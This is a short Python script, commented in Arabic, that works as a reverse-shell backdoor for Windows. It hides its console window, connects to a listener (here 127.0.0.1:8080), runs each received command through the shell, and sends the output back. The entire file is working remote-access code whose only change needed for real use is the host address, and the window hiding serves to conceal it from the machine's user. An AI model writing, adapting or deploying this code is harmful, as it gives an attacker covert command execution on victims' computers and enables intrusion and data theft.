import ctypes
import socket
import subprocess
import os

def hide():
    # إخفاء نافذة الكونسول
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def execute_command(command):
    """تنفيذ الأمر وإرجاع الإخراج."""
    try:
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        return output.stdout + output.stderr
    except Exception as e:
        return str(e)

def connect():
    hide()  # إخفاء النافذة
    s = socket.socket()
    s.connect(("127.0.0.1", 8080))  # استخدام localhost

    while True:
        command = s.recv(1024).decode()

        if command.lower() == "exit":
            break

        if command.startswith("cd "):
            try:
                os.chdir(command.strip("cd "))
                s.send(b"Changed directory")
            except FileNotFoundError as e:
                s.send(str(e).encode())
        else:
            output = execute_command(command)
            s.send(output.encode())

    s.close()

if __name__ == "__main__":
    connect()